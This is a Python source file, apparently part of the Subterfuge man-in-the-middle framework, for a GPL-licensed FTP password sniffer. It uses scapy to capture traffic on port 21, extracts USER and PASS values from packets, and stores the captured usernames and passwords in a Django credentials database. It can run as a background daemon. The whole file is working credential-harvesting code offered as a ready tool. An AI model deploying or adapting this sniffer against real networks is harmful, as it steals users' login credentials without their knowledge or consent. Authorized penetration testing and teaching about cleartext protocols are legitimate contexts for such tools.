#!/usr/bin/python

#############################################################################
##                                                                         ##
## ftp_password_sniffer.py --- Simple FTP password sniffer using scapy     ##
##              see http://trac.innovacode.com/ for latest release         ##
##                                                                         ##
## Copyright (C) 2008  Franck TABARY <franck.tab atat gmail thedot com>    ##
##                                                                         ##
## This program is free software; you can redistribute it and/or modify it ##
## under the terms of the GNU General Public License version 2 as          ##
## published by the Free Software Foundation; version 2.                   ##
##                                                                         ##
## This program is distributed in the hope that it will be useful, but     ##
## WITHOUT ANY WARRANTY; without even the implied warranty of              ##
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU       ##
## General Public License for more details.                                ##
##                                                                         ##
#############################################################################


import logging 
import re
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import os
import sys
sys.path.append('/usr/share/subterfuge')
sys.path.append('/usr/share')
import getopt
import time
import datetime

#Ignore Deprication Warnings
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

import django
django.setup()
'''
from django.conf import settings
settings.configure(DATABASE_ENGINE="sqlite3",
                   DATABASE_HOST="",
                   DATABASE_NAME= "/usr/share/subterfuge/db",
                   DATABASE_USER="",
                   DATABASE_PASSWORD="")
'''

from django.db import models
from subterfuge.main.models import credentials

#################################
##### Define some constants #####
#################################

APP_NAME='ftp_password_sniffer'
LOGFILE = '/var/log/'+APP_NAME+'.log'
PIDFILE = '/var/run/'+APP_NAME+'.pid'

conf.iface='eth0'
conf.verb=0
conf.promisc=0

last_ftp_login=''
last_ftp_pw=''

login_success='success'
login_failed='failed'

log=None

##########################################
##### printUsage: display short help #####
##########################################

def printUsage():
    print "Password Sniffer."
    print ""
    print "Usage: password_sniffer [option]"
    print ""
    print "Valid options:"
    print "  -h, --help             : display this help"
    print "  -c, --console          : don't fork into background"
    print "  -d, --debug            : switch to debug log level"
    print ""

##############################################################
##### getFtpCredentiels: extract login/pass from packets #####
##############################################################

def getFtpCredentials(pkt):

    global last_ftp_login, last_ftp_pw, log

    src=pkt.sprintf("%IP.src%")
    dst=pkt.sprintf("%IP.dst%")
    sport=pkt.sprintf("%IP.sport%")
    dport=pkt.sprintf("%IP.dport%")
    raw=pkt.sprintf("%Raw.load%")

    if dport=='21':
        raw=raw[0:-5]
        # From client
        user=re.findall("(?i)USER (.*)",raw)
        if user:
            last_ftp_login=user[0]

        pw=re.findall("(?i)PASS (.*)",raw)
        if pw:
            last_ftp_pw=pw[0]

        if last_ftp_login and last_ftp_pw:
            now = datetime.datetime.now()
            date = now.strftime("%d-%m-%Y %H:%M")
	    addsrc = "FTP: "
            logcred = credentials(source = addsrc + dst, username = last_ftp_login, password = last_ftp_pw, date = date)
            logcred.save()

            last_ftp_login=''
            last_ftp_pw=''

#####################################################
##### callback: called for each packet received #####
#####################################################

def callback(pkt):

    global log

    sport=pkt.sprintf("%IP.sport%")
    dport=pkt.sprintf("%IP.dport%")
    raw=pkt.sprintf("%Raw.load%")    

    if raw!='??':

        log.debug(raw)

        # FTP
        if dport=='21' or sport=='21':
            getFtpCredentials(pkt)

########################################################################
##### daemonize: if -d param not specified, daemonize this program #####
########################################################################

def daemonize (stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
    '''This forks the current process into a daemon.
    The stdin, stdout, and stderr arguments are file names that
    will be opened and be used to replace the standard file descriptors
    in sys.stdin, sys.stdout, and sys.stderr.
    These arguments are optional and default to /dev/null.
    Note that stderr is opened unbuffered, so
    if it shares a file with stdout then interleaved output
    may not appear in the order that you expect.
    '''

    # Do first fork.
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)   # Exit first parent.
    except OSError, e:
        sys.stderr.write ("fork #1 failed: (%d) %s\n" % (e.errno, e.strerror) )
        sys.exit(1)

    # Decouple from parent environment.
    os.chdir("/")
    os.umask(0)
    os.setsid()

    # Do second fork.
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)   # Exit second parent.
    except OSError, e:
        sys.stderr.write ("fork #2 failed: (%d) %s\n" % (e.errno, e.strerror) )
        sys.exit(1)

    # Now I am a daemon!

    # Redirect standard file descriptors.
    si = open(stdin, 'r')
    so = open(stdout, 'a+')
    se = open(stderr, 'a+', 0)
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())

################
##### main #####
################

def main():
    global log

    debugMode=False
    consoleMode=False

    try:
        opts, args = getopt.getopt(sys.argv[1:], 'cdh', ['console','debug','help'])
    except getopt.error, msg:
        print msg
        print 'for help use --help'
        sys.exit(2)

    # process options
    for o, a in opts:
        if o in ('-h', '--help'):
            printUsage()
            return 
        if o in ('-d', '--debug'):
            debugMode=True
        if o in ('-c', '--console'):
            consoleMode=True

    log=logging.getLogger(APP_NAME)

    if consoleMode:
        handler = logging.StreamHandler()
    else:
        handler = logging.FileHandler(LOGFILE)

    formatter = logging.Formatter('%(asctime)s %(levelname)s %(message)s')
    handler.setFormatter(formatter)
    log.addHandler(handler)

    if debugMode==False:
        log.setLevel(logging.INFO)
    else:
        log.setLevel(logging.DEBUG)
        
    expr='tcp port 21'
    log.info("Listening on "+expr)

    if debugMode:
        log.info("Debug mode activated")

    if consoleMode:
        log.info("Console mode activated")
    else:
        daemonize()

    try:
        sniff(filter=expr, prn=callback, store=0)
    except KeyboardInterrupt:
        exit(0)


if __name__ == "__main__":
    main()

